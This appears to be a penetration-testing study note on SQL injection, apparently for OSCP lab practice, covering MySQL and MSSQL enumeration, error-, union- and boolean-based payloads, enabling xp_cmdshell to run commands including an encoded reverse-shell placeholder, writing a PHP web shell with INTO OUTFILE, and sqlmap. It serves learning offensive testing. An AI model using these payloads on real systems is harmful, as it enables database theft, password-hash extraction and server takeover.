---
description: >-
  SQL injection (SQLi) is a web security vulnerability that allows an attacker
  to interfere with the queries a web application makes to its database. By
  manipulating input fields.
---

# SQL Injection (SQLi)

## Enumeration

### MySQL

[MySQL ](https://dev.mysql.com/doc/)is a popular open-source relational database management system (RDBMS) often used in web applications. It’s a common target for attackers due to its widespread use and the potential to expose sensitive data through SQL injection or other vulnerabilities.

connect to `mysql` remotely

```bash
mysql -u root -p'root' -h 192.168.191.16 -P 3306
```

retrieve the version of the running SQL instance

```sql
select version();
```

retrieve the current username and hostname for the MySQL connection.

```sql
select system_user();
```

list all of the databases running in the MYSQL session.

```sql
show databases;
```

retrieve mysql user password hash

```sql
select user, authentication_string from mysql.user where user = '<username>';
```

A trick to output vertically and get normal formatting

```bash
select * from mysql.user where user = 'offsec'\G;
```

### MSSQL

[MSSQL](http://www.microsoft.com/sqlserver) is a database management system that natively integrates into the Windows ecosystem.

* Windows has a built-in command-line tool named [_SQLCMD_](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility), that allows SQL queries to be run through the Windows command prompt or even remotely from another machine.

connect to mssql using windows authentication

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

retrieve the version of the running SQL instance

```sql
select @@version;
```

list all of the databases running in the MYSQL session.

```sql
select name from sys.databases;
```

list `dbo` users of the current database

```sql
select * from offsec.dbo.users;
```

list all of the database tables

```sql
select * from offsec.information_schema.tables;
```

## Manual Exploitation

### Error Based

**Error-based SQL injection** relies on extracting information from the database by triggering error messages that reveal valuable details.

The following examples show how to trigger errors and extract information using Error-Based injection:

```sql
' or 1=1 in (select @@version)-- -
```

```sql
' or 1=1 in (select password from users where username = 'admin')-- -
```

### **Union Based**

**Union-based SQL injection** enables attackers to concatenate results of malicious query with a legitimate one by using `union` operator, allowing them to retrieve additional information from other tables.

In order to make the **union-based SQL injection** work, the attacker must satisfy two conditions:

1. Ensure that the **number of columns** in the injected query match those of the original query .

The number of columns can be found using `ORDER BY` and incrementing the number until the query failed:

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
etc...
```

It's less recommended but it possible also to enumerate the number of columns using `UNION` and `NULL` values until the query works:

```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
etc...
```

2. Ensure that the **data types** in the injected query match those of the original query.

The following examples describes the process of finding string column, when the query works means the column using `'a'` is a string column.

```
' UNION SELECT 'a',NULL,NULL,NULL-- -
' UNION SELECT NULL,'a',NULL,NULL-- -
' UNION SELECT NULL,NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,NULL,'a'-- -
etc...
```

### Boolean-Based

**Boolean-based SQL injection** is used in case the query does not reflect the results of the injected query, so it relies on extracting information by using conditions and changes of the web application.

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

### MSSQL System Procedures&#x20;

SQL Server supports the following system stored procedures that provide an interface from an instance of SQL Server to external programs, for various maintenance activities.

* [xp\_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
* [xp\_enumgroups](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-enumgroups-transact-sql?view=sql-server-ver15)
* [xp\_grantlogin](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-grantlogin-transact-sql?view=sql-server-ver15)
* [xp\_logevent](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-logevent-transact-sql?view=sql-server-ver15)
* [xp\_logininfo](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-logininfo-transact-sql?view=sql-server-ver15)
* [xp\_msver](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-msver-transact-sql?view=sql-server-ver15)
* [xp\_revokelogin](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-revokelogin-transact-sql?view=sql-server-ver15)
* [xp\_sprintf](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-sprintf-transact-sql?view=sql-server-ver15)
* [xp\_sqlmaint](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-sqlmaint-transact-sql?view=sql-server-ver15)
* [xp\_sscanf](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-sscanf-transact-sql?view=sql-server-ver15)

**xp\_cmdshell** procedure allows **sysadmin** to execute os commands

Enable `xp_cmdshell` procedure:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

exec('sp_configure''show+advanced+option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')
```

Execute commands using `xp_cmdshell:`

```sql
EXECUTE xp_cmdshell 'whoami';

exec master..xp_cmdshell 'powershell -e <base64_revshell>'
```

### Create Files

It's possible to create a file on the server disk using SQL query for example:

```sql
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"
```

## Automated Exploitation

**sqlmap** is a tool which used to automate exploit a SQLi vulnerability given request with the vulnerable parameter.

**sqlmap** is **not allowed** in the OSCP exam so I won't dig in it.

```bash
sqlmap -r request.txt -p item 
```

{% embed url="https://github.com/sqlmapproject/sqlmap" %}
sqlmap - automated sqli tool
{% endembed %}

## References

{% embed url="https://learn.microsoft.com/en-us/sql/sql-server" %}

{% embed url="https://dev.mysql.com/doc/" %}

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

